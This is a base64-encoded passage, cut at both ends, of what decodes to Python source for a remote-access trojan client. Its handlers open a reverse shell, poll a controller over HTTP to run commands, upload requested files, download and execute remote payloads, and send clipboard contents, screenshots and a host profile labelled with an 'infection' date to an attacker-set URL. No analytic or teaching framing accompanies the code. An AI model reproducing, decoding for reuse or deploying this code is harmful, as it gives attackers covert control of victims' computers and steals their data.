CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHMucmVjdigxMDI0KS5kZWNvZGUoInV0Zi04IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgY29tbWFuZC5sb3dlcigpID09ICJleGl0IjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KGNvbW1hbmQsIHNoZWxsPVRydWUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzLnNlbmQob3V0cHV0KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiQ29ubmVjdGlvbiBmYWlsZWQ6Iiwgc3RyKGUpKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3QgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1zaGVsbCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3Quc3RhcnQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgRToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoRSkKICAgICAgCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgIlNIRUxMLUVYVC1IVFRQIiBpbiBmaW5kOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChicmNrKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnB1dF9zdHJpbmcgPSBicmNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNwbGl0X3N0cmluZ3MgPSBpbnB1dF9zdHJpbmcuc3BsaXQoIjoiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpcF9hZGRyZXNzID0gc3BsaXRfc3RyaW5nc1swXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwb3J0X251bWJlciA9IHNwbGl0X3N0cmluZ3NbMV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIklQIEFkZHJlc3M6IiwgaXBfYWRkcmVzcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlBvcnQgTnVtYmVyOiIsIHBvcnRfbnVtYmVyKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmIHNoZWxsKCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmIHNlbmRfcG9zdChkYXRhLCB1cmw9ZidodHRwOi8ve2lwX2FkZHJlc3N9Ontwb3J0X251bWJlcn0nKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHsicmZpbGUiOiBkYXRhfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gcGFyc2UudXJsZW5jb2RlKGRhdGEpLmVuY29kZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwsIGRhdGE9ZGF0YSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVxdWVzdC51cmxvcGVuKHJlcSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmIHNlbmRfZmlsZShjb21tYW5kKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JhYiwgcGF0aCA9IGNvbW1hbmQuc3RyaXAoKS5zcGxpdCgnICcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0b3JlX3VybCA9IGYnaHR0cDovL3tpcF9hZGRyZXNzfTp7cG9ydF9udW1iZXJ9L3N0b3JlJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ocGF0aCwgJ3JiJykgYXMgZnA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kX3Bvc3QoZnAucmVhZCgpLCB1cmw9c3RvcmVfdXJsKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWYgcnVuX2NvbW1hbmQoY29tbWFuZCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENNRCA9IHN1YnByb2Nlc3MuUG9wZW4oY29tbWFuZCwgc3RkaW49c3VicHJvY2Vzcy5QSVBFLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFLCBzaGVsbD1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kX3Bvc3QoQ01ELnN0ZG91dC5yZWFkKCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfcG9zdChDTUQuc3RkZXJyLnJlYWQoKSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHJlcXVlc3QudXJsb3BlbihmImh0dHA6Ly97aXBfYWRkcmVzc306e3BvcnRfbnVtYmVyfSIpLnJlYWQoKS5kZWNvZGUoKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3Rlcm1pbmF0ZScgaW4gY29tbWFuZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnZ3JhYicgaW4gY29tbWFuZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfZmlsZShjb21tYW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU2CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBydW5fY29tbWFuZChjb21tYW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJDb25uZWN0aW9uIGZhaWxlZDoiLCBzdHIoZSkpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNoZWxsKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdC5zdGFydCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBFOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChFKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICJFQ0hPIiBpbiBmaW5kOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGJyY2spCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgIk1FU1NBR0UiIGluIGZpbmQ6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGJyY2spCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydHMgPSBicmNrLnNwbGl0KCI6IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZSA9IHBhcnRzWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYm9keSA9IHBhcnRzWzFdCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiVGl0bGU6IiwgdGl0bGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkJvZHk6IiwgYm9keSkKCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGd1aSA9PSBUcnVlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290ID0gdGsuVGsoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LndpdGhkcmF3KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGtpbnRlci5tZXNzYWdlYm94LnNob3dpbmZvKHRpdGxlLCBib2R5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LmRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAiQ01EIiBpbiBmaW5kOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbShicmNrKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICJET1dOTE9BRCIgaW4gZmluZDoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoYnJjaykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZWRfdXJsID0gdXJsbGliLnBhcnNlLnVybHBhcnNlKGJyY2spCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZW5hbWUgPSBvcy5wYXRoLmJhc2VuYW1lKHBhcnNlZF91cmwucGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzYXZlX2RpcmVjdG9yeSA9IG9zLmdldGN3ZCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWxfZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKHNhdmVfZGlyZWN0b3J5LCBmaWxlbmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZShicmNrLCBsb2NhbF9maWxlX3BhdGgpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuYW1lID0gcGxhdGZvcm0udW5hbWUoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdGluZ19zeXN0ZW0gPSB1bmFtZS5zeXN0ZW0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgb3BlcmF0aW5nX3N5c3RlbSA9PSAnV2luZG93cyc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN0YXJ0ZmlsZShsb2NhbF9maWxlX3BhdGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXywgZmlsZV9leHRlbnNpb24gPSBvcy5wYXRoLnNwbGl0ZXh0KGxvY2FsX2ZpbGVfcGF0aCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZpbGVfZXh0ZW5zaW9uID09ICcuc2gnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydiYXNoJywgbG9jYWxfZmlsZV9wYXRoXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBmaWxlX2V4dGVuc2lvbiA9PSAnLnB5JzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsncHl0aG9uMycsIGxvY2FsX2ZpbGVfcGF0aF0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgZmlsZV9leHRlbnNpb24gPT0gJy5qYXInOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydqYXZhJywgJy1qYXInLCBsb2NhbF9maWxlX3BhdGhdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGlmIG9zLmFjY2Vzcyhsb2NhbF9maWxlX3BhdGgsIG9zLlhfT0spOiAgIyBDaGVjayBpZiB0aGUgZmlsZSBpcyBleGVjdXRhYmxlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbJy4vJyArIGxvY2FsX2ZpbGVfcGF0aF0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyd4ZGctb3BlbicsIGxvY2FsX2ZpbGVfcGF0aF0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICJDTElQQk9BUkQiIGluIGZpbmQ6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QgPSB0ay5UaygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3Qud2l0aGRyYXcoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGlwYm9hcmRfY29udGVudHMgPSByb290LmNsaXBib2FyZF9nZXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LmRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXN0b21fZGF0YSA9IGNsaXBib2FyZF9jb250ZW50cwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSBzZW5kdG91cmwrInN0b3JlLWRhdGEucGhwIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPXsiZGF0YSI6IGN1c3RvbV9kYXRhfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoImRhdGEgc2VudCIsdXJsKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICJTQ1JFRU5TSE9UIiBpbiBmaW5kOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bmFtZSA9IHBsYXRmb3JtLnVuYW1lKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVyYXRpbmdfc3lzdGVtID0gdW5hbWUuc3lzdGVtCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9wZXJhdGluZ19zeXN0ZW0gPT0gJ1dpbmRvd3MnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbSA9IHB5YXV0b2d1aS5zY3JlZW5zaG90KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbSA9IEltYWdlR3JhYi5ncmFiKCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW1fYnl0ZXMgPSBpby5CeXRlc0lPKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbS5zYXZlKGltX2J5dGVzLCBmb3JtYXQ9J1BORycpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVzID0geydzY3JlZW5zaG90JzogKCdzY3JlZW5zaG90LnBuZycsIGltX2J5dGVzLmdldHZhbHVlKCksICdpbWFnZS9wbmcnKX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3Qoc2VuZHRvdXJsICsgJ3NjcmVlbnNob3QucGhwJywgZmlsZXM9ZmlsZXMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQocmVzcG9uc2UudGV4dCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAiRVhUUkFDVCIgaW4gZmluZDoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoImV4dHJhY3QgY29tbWFuZCByZWNpZXZlZCIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXAgPSBvcy5wYXRoLnNlcAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuYXJndlswXSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdldGF0dHIoc3lzLCAnZnJvemVuJywgRmFsc2UpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0X3BhdGggPSBvcy5wYXRoLmFic3BhdGgoc3lzLmV4ZWN1dGFibGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0X2RpcmVjdG9yeSA9IG9zLnBhdGguZGlybmFtZShzY3JpcHRfcGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0X2ZpbGVuYW1lID0gb3MucGF0aC5iYXNlbmFtZShzY3JpcHRfcGF0aCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWUgPSBzY3JpcHRfZGlyZWN0b3J5K3NlcCtzY3JpcHRfZmlsZW5hbWUKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuYW1lID0gcGxhdGZvcm0udW5hbWUoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdWJsaWNfaXAgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwczovL2lkZW50Lm1lJykucmVhZCgpLmRlY29kZSgndXRmOCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaXZhdGVfaXAgPSBzb2NrZXQuZ2V0aG9zdGJ5bmFtZShzb2NrZXQuZ2V0aG9zdG5hbWUoKSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1hY19hZGRyZXNzID0gKCc6Jy5qb2luKFsnezowMnh9Jy5mb3JtYXQoKHV1aWQuZ2V0bm9kZSgpID4+IGVsZSkgJiAweGZmKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGVsZSBpbiByYW5nZSgwLDgqNiw4KV1bOjotMV0pKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3BlcmF0aW5nX3N5c3RlbSA9IHVuYW1lLnN5c3RlbQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVyYXRpbmdfc3lzdGVtX3ZlcnNpb24gPSBwbGF0Zm9ybS52ZXJzaW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3lzdGVtX2hvc3RuYW1lID0gc29ja2V0LmdldGhvc3RuYW1lKCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN5c3RlbV9hcmNoaXRlY3R1cmUgPSBwbGF0Zm9ybS5hcmNoaXRlY3R1cmUoKTtzdHJpbmcgPSBzeXN0ZW1fYXJjaGl0ZWN0dXJlO3N0cmluZz1zdHIoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcpO3N0cmluZz1zdHJpbmcucmVwbGFjZSgiJyIsIiIpO3N0cmluZz1zdHJpbmcucmVwbGFjZSgiKSIsIiIpO3N0cmluZz1zdHJpbmcucmVwbGFjZSgiKCIsIiIpO3N5c3RlbV9hcmNoaXRlY3R1cmU9c3RyaW5nCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZXNzb3JfYnVpbGQgPSB1bmFtZS5tYWNoaW5lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNwdV9jb3VudCA9IG9zLmNwdV9jb3VudCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsLCB1c2VkLCBmcmVlID0gc2h1dGlsLmRpc2tfdXNhZ2UoIi8iKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ3RvdGFsX3N0b3JhZ2UgPSAiVG90YWwgQzogU3RvcmFnZTogJWQgZ2IiICUgKHRvdGFsIC8vICgyKiozMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEN1c2VkX3N0b3JhZ2UgPSAiVXNlZCBDOiBTdG9yYWdlOiAlZCBnYiIgJSAodXNlZCAvLyAoMioqMzApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDZnJlZV9zdG9yYWdlID0gIkZyZWUgQzogU3RvcmFnZTogJWQgZ2IiICUgKGZyZWUgLy8gKDIqKjMwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcnVubmluZ19wcm9jZXNzZXMgPSBvcy5wb3Blbignd21pYyBwcm9jZXNzIGdldCBkZXNjcmlwdGlvbiwgcHJvY2Vzc2lkJykucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdGluZ19zeXN0ZW0gPSBwbGF0Zm9ybS5zeXN0ZW0oKQoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGYnaHR0cDovL2lwLWFwaS5jb20vanNvbi97cHVibGljX2lwfScpLmNvbnRlbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IGpzb24ubG9hZHMocmVzcG9uc2UpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50X2F2YWlsYWJsZV9kcml2ZXMgPSBkcml2ZXMgPSBbY2hyKHgpKyI6ImZvciB4IGluIHJhbmdlKDY1LDkxKWlmIG9zLnBhdGguZXhpc3RzKGNocih4KSsiOiIpXTtzdHJpbmc9ZHJpdmVzO3N0cmluZz1zdHIoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcpO3N0cmluZz1zdHJpbmcucmVwbGFjZSgiXSIsIiIpO3N0cmluZz1zdHJpbmcucmVwbGFjZSgiWyIsIiIpO3N0cmluZz1zdHJpbmcucmVwbGFjZSgiJyIsIiIpO2N1cnJlbnRfYXZhaWxhYmxlX2RyaXZlcz1zdHJpbmcKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9wZXJhdGluZ19zeXN0ZW0gIT0gJ1dpbmRvd3MnOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9zLmdldGV1aWQoKSA9PSAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaXYgPSBUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaXYgPSBGYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXQgPSBmJycnCgoKICAgID0tPS09LT0tPS09IEdFTyBJTkZPUk1BVElPTiA9LT0tPS09LT0tPQoKICAgIENvdW50cnk6IHtkYXRhWydjb3VudHJ5J119CiAgICBSZWdpb246IHtkYXRhWydyZWdpb25OYW1lJ119CiAgICBDaXR5OiB7ZGF0YVsnY2l0eSddfQogICAgWmlwOiB7ZGF0YVsnemlwJ119CiAgICBMYXRpdHVkZToge2RhdGFbJ2xhdCddfQogICAgTG9uZ2l0dWRlOiB7ZGF0YVsnbG9uJ119CiAgICBJU1A6IHtkYXRhWydpc3AnXX0KCiAgICA9LT0tPS09LT0tPSBQQVlMT0FEIElORk9STUFUSU9OID0tPS09LT0tPS09CgogICAgUGF5bG9hZCBGaWxlIE5hbWUvTG9jYXRpb246IHtzY3JpcHRfZGlyZWN0b3J5X2ZpbGVuYW1lfQogICAgTW9zdCBSZWNlbnQgSW5mZWN0aW9uIERhdGUvVGltZToge2Zvcm1hdChmb3JtYXR0ZWRfZGF0ZXRpbWUpfQogICAgQWRtaW4vUm9vdCBmaWxlIHByaXZpbGFnZXM6IHtwcml2fQogICAgR1VJOiB7Z3VpfQoKICAgID0tPS09LT0tPS09IFNZU1RFTSBJTkZPUk1BVElPTiA9LT0tPS09LT0tPQoKICAgIFN5c3RlbSBIb3N0bmFtZToge3N5c3RlbV9ob3N0bmFtZX0KICAgIE9wZXJhdGluZyBTeXN0ZW06IHtvcGVyYXRpbmdfc3lzdGVtfQogICAgT3BlcmF0aW5nIFN5c3RlbSBWZXJzaW9uOiB7b3BlcmF0aW5nX3N5c3RlbV92ZXJzaW9ufQoKICAgIFB1YmxpYyBJUCBBZGRyZXNzOiB7cHVibGljX2lwfQogICAgUHJpdmF0ZSBJUCBBZGRyZXNzOiB7cHJpdmF0ZV9pcH0KICAgIE1BQyBBZGRyZXNzOiB7bWFjX2FkZHJlc3N9CgogICAgU3lzdGVtIEFyY2hpdGVjdHVyZToge3N5c3RlbV9hcmNoaXRlY3R1cmV9CiAgICBQcm9jZXNzb3IgQnVpbGQ6IHtwcm9jZXNzb3JfYnVpbGR9CiAgICBDUFUgQ291bnQ6IHtjcHVfY291bnR9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJycnCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvcGVyYXRpbmdfc3lzdGVtID09ICdXaW5kb3dzJzoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB